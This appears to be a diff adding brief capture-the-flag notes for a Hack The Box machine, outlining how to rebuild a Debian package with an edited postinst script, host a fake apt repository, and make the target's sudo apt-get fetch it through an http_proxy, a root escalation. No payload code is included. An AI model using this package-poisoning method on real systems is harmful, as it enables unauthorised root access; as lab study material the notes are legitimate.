@@ -1,0 +1,23 @@
+mkdir tmp
+dpkg-deb -R original.deb tmp
+# edit DEBIAN/postinst
+dpkg-deb -b tmp fixed.deb
+
+
+reprepro -b devuan/ includedeb ascii reportbug_9.1.deb
+
+
+INCLUDE/CREATE IN DISTRIBUTIONS
+Origin: package.onetwoseven.htb
+Label: package.onetwoseven.htb
+Codename: ascii
+Architectures: amd64 source
+Components: main
+
+
+1. Create directory structure: "http:/" > "packages.onetwoseven.htb" > "devuan" > here is your repo
+2. You should add 127.0.0.1 packages.onetwoseven.htb in /etc/hosts
+3. To host correctly you should be in folder which contain "http:/" directrory
+4. python -m SimpleHTTPServer 80
+5. On box: sudo http_proxy="http://ip/" apt-get update
+
